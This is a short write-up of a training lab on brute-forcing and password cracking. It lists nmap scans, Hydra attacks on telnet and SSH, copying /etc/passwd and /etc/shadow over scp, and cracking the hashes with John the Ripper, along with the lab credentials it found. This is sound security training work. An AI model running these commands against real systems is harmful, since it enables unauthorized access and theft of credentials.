#Bruteforce and Password Cracking Lab - RCM 8/15/2021

#Description

The lab is divided in two main parts:

    Network authentication cracking

    Bruteforce and password cracking

In the first part of the lab you will have to use different network authentication cracking techniques and tools against services available on the target machine.

Once valid credentials have been found, it is time to download the passwords stored on the remote system and use John the Ripper to crack them!

#Goal

The final goal of the lab is retrieve the passwords of at least ten users on the target machine!

#Tools

The best tools for this lab are:

    Network authentication cracking tools such as Hydra

    Cracking tools such as John the Ripper

#Steps

1. Find alive hosts on the network. 
`nmap -sn 192.168.99.100/24`
Discovered two alive hosts on the network: 192.168.99.22,100 

2. Port scan and service detection
`sudo nmap -sS -sV -O 192.168.99.22,100 -oN servicenmap.txt`
UH OH TELNET'S OPEN.
192.168.99.22 is a Debian Linux machine
Port 22 SSH and Port 23 telnet are both open. 

3. Bruteforce service authentication (network authentication Hydra; cracker John)
Hydra to connect with the telnet service. Password list kind of weird.. will try SSH. 
`hydra -t 4 -V -f -L minimal.usr -P rockyou-10.txt telnet://192.168.99.22`
 - remove `minimal list of most common usernames` from minimal.usr first or hydra won't work.
 - this takes a while to run. 
Login Creds found: `[23][telnet] host: 192.168.99.22   login: sysadmin   password: secret`
Testing ssh connection as well.
`sudo hydra -t 8 -V -f -L minimal.usr -P rockyou-15.txt ssh://192.168.99.22`
ssh credentials `[22][ssh] host: 192.168.99.22   login: root   password: 123abc`
4. Download and crack the local password on the system 
   Download passwd and shadow files. 
   `scp root@192.168.99.22:/etc/passwd .`
   `scp root@192.168.99.22:/etc/shadow .`
   The files are located in kali attacker machine.
   Crack the files here:
   `unshadow passwd shadow > hashes.txt`
   Finally crack the password hashes using John.
   `john hashes.txt > cracked.txt`

    Cracked the hashes!
